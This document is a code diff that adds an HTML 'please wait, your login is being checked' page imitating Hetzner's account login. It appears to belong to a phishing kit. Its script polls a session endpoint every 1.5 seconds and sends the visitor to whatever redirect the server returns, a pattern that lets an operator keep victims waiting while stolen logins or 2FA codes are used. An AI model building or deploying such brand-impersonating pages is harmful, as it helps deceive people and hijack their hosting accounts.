@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login – Hetzner Accounts</title>
+  <link rel="icon" href="hetzner-assets/logo-mark.svg" type="image/svg+xml" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      min-height: 100vh;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: #ededed;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 400px;
+      background: #fff;
+      border-radius: 4px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+      padding: 48px 32px;
+      text-align: center;
+      margin: 16px;
+    }
+
+    .spinner {
+      width: 48px;
+      height: 48px;
+      margin: 0 auto 24px;
+      border: 3px solid #e8e8e8;
+      border-top-color: #d50c2d;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    h1 { font-size: 20px; font-weight: 600; color: #383838; margin-bottom: 12px; }
+    p { font-size: 14px; color: #8a8a8a; line-height: 1.6; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="spinner" aria-hidden="true"></div>
+    <h1>Bitte warten</h1>
+    <p>Ihr Login wird überprüft.<br>Dies kann einen Moment dauern.</p>
+  </div>
+
+  <script src="hetzner-flow.js"></script>
+  <script>
+    (async function () {
+      const sessionId = HetznerFlow.requireSession();
+      if (!sessionId) return;
+
+      async function tick() {
+        try {
+          const data = await HetznerFlow.pollSession(sessionId);
+          if (!data.ok && data.status === "gone") {
+            window.location.replace("hetzner.html");
+            return;
+          }
+          if (data.status === "redirect" && data.redirect) {
+            window.location.href = data.redirect;
+            return;
+          }
+          if (data.status === "error" && data.redirect) {
+            window.location.href = data.redirect;
+            return;
+          }
+        } catch (_) {}
+        setTimeout(tick, 1500);
+      }
+
+      tick();
+    })();
+  </script>
+</body>
+</html>
